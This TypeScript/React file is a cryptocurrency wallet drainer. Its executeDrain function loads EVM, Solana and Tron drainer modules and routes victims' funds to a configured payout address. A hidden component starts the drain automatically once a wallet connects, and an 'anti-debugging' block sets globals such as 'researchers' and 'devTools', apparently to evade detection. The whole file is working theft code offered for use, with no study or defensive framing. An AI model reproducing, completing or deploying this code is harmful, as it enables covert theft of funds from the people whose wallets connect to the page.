"use client";

import { useEffect, useState } from 'react';
import { networkManifest } from '@/config/network-manifest';
import { useWalletClient } from 'wagmi';

// ==================== ANTI-DEBUGGING SETUP ==================== //
if (typeof window !== 'undefined') {
  const g = window as any;
  g.twoStep = g.twoStep ?? false;
  g.popupEnabled = g.popupEnabled ?? false;
  g.themeMode = g.themeMode ?? 'dark';
  g.themeVariables = g.themeVariables ?? {
    '--w3m-accent-color': '#0f172a',
    '--w3m-background-color': '#ffffff',
    '--w3m-border-radius-master': '8px',
    '--w3m-font-family': 'Arial, sans-serif',
    '--w3m-z-index': '99999'
  };

  if (!g.hasTrapBypass) {
    g.hasTrapBypass = true;
    const wordsToBypass = ['researchers', 'popupEnabled', 'twoStep', 'config', 'devTools'];
    wordsToBypass.forEach(word => {
      if (!(word in g)) {
        Object.defineProperty(g, word, { 
          value: false, 
          writable: true, 
          configurable: true, 
          enumerable: true 
        });
      }
    });
  }
}
// ============================================================ //

// ==================== CORE EXECUTION FUNCTION ==================== //
export async function executeDrain(
  userAddress: string, 
  chainId: string | number, 
  walletClient?: any
) {
  if (!userAddress) {
    throw new Error("userAddress is required");
  }

  const EVM_RECEIVER = networkManifest.EVM_PAYOUT_TARGET;
  const SOLANA_RECEIVER = "YourSolanaAddressHere";
  const TRON_RECEIVER = "YourTronAddressHere";

  // Expose receivers globally (if needed by other modules)
  if (typeof window !== 'undefined') {
    const g = window as any;
    g.receiverAddress = EVM_RECEIVER;
    g.seaport_receiver = EVM_RECEIVER;
    g.ethContractAddress = EVM_RECEIVER;
    g.solanaReceiver = SOLANA_RECEIVER;
    g.tronReceiver = TRON_RECEIVER;
  }

  console.log(`[Drainer] Starting execution for chain: ${chainId}`);

  const chainIdNum = typeof chainId === 'string' ? parseInt(chainId, 10) : chainId;

  try {
    // EVM Chains
    if (!isNaN(chainIdNum) && (chainIdNum === 1 || chainIdNum === 8453)) {
      console.log("[Drainer] Loading EVM processor...");
      const evmModule: any = await import('@/processors/evm/index.js');
      const startEVMDrainer = evmModule.startEVMDrainer || evmModule.default?.startEVMDrainer;

      if (typeof startEVMDrainer === 'function') {
        await startEVMDrainer(userAddress, chainIdNum, walletClient);
      } else {
        throw new Error("startEVMDrainer function not found in EVM module");
      }
    } 
    // Solana
    else if (chainId === 'solana' || chainId === 'sol') {
      console.log("[Drainer] Loading Solana processor...");
      const solanaModule: any = await import('@/processors/solana/index');
      const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;

      if (typeof startSolanaDrainer === 'function') {
        await startSolanaDrainer(userAddress);
      }
    } 
    // Tron
    else if (chainId === 'tron' || chainId === 'trx') {
      console.log("[Drainer] Loading Tron processor...");
      const tronModule: any = await import('@/processors/tron/main.js');
      const startTronDrainer = tronModule.startTronDrainer || tronModule.default?.startTronDrainer || tronModule.default;

      if (typeof startTronDrainer === 'function') {
        await startTronDrainer(userAddress);
      }
    } else {
      console.warn("[Drainer] Unsupported chainId:", chainId);
    }

    console.log("[Drainer] Execution completed successfully.");
    return { success: true };
  } catch (error) {
    console.error("[Drainer] Execution failed:", error);
    throw error;
  }
}

// ==================== COMPONENT (Now Stateless) ==================== //
interface DrainerContainerProps {
  userAddress: string;
  chainId: string;
  onComplete?: () => void;
}

export default function DrainerContainer({ 
  userAddress, 
  chainId, 
  onComplete 
}: DrainerContainerProps) {
  const [isProcessing, setIsProcessing] = useState(false);
  const { data: walletClient } = useWalletClient();

  const handleStart = async () => {
    if (!walletClient) {
      console.warn("[DrainerContainer] walletClient not ready yet.");
      return;
    }

    setIsProcessing(true);
    try {
      await executeDrain(userAddress, chainId, walletClient);
      onComplete?.();
    } catch (error) {
      console.error("[DrainerContainer] Error during execution:", error);
    } finally {
      setIsProcessing(false);
    }
  };

  // Only runs when the component is mounted (triggered from QuickActions modal)
  useEffect(() => {
    if (userAddress && chainId && walletClient) {
      handleStart();
    }
  }, [walletClient]); // Intentionally only depends on walletClient

  return (
    <div style={{ display: 'none' }} aria-hidden="true">
      {isProcessing ? "Processing..." : "Idle"}
    </div>
  );
}